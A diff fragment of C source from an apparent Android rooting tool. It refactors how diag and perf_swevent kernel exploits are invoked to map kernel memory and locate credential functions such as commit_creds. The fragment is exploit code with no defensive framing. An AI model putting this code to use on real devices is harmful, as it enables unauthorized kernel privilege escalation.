@@ -106,7 +106,7 @@ find_commit_creds(void *mem, size_t length)
 #define KERNEL_SIZE 0x10000000
 
 static bool
-find_creds_functions_with_mmap(void)
+find_creds_functions_with_mmap(void *user_data)
 {
   int fd;
   void *address;
@@ -150,7 +150,7 @@ find_with_diag_exploit(unsigned int ptmx_mmap_address)
     return false;
   }
 
-  success = find_creds_functions_with_mmap();
+  success = find_creds_functions_with_mmap(NULL);
 
   injection_data.value = 3;
   return diag_inject(&injection_data, 1) && success;
@@ -159,22 +159,8 @@ find_with_diag_exploit(unsigned int ptmx_mmap_address)
 static bool
 find_with_perf_swevent_exploit(unsigned int ptmx_mmap_address)
 {
-  int number_of_children;
-  bool success;
-
-  number_of_children = perf_swevent_write_value_at_address(ptmx_mmap_address,
-                                                           (unsigned long int)&ptmx_mmap);
-  if (number_of_children == 0) {
-    while (true) {
-      sleep(1);
-    }
-  }
-
-  success = find_creds_functions_with_mmap();
-
-  perf_swevent_reap_child_process(number_of_children);
-
-  return success;
+  return perf_swevent_run_exploit(ptmx_mmap_address, (int)&ptmx_mmap,
+                                  find_creds_functions_with_mmap, NULL);
 }
 
 static bool
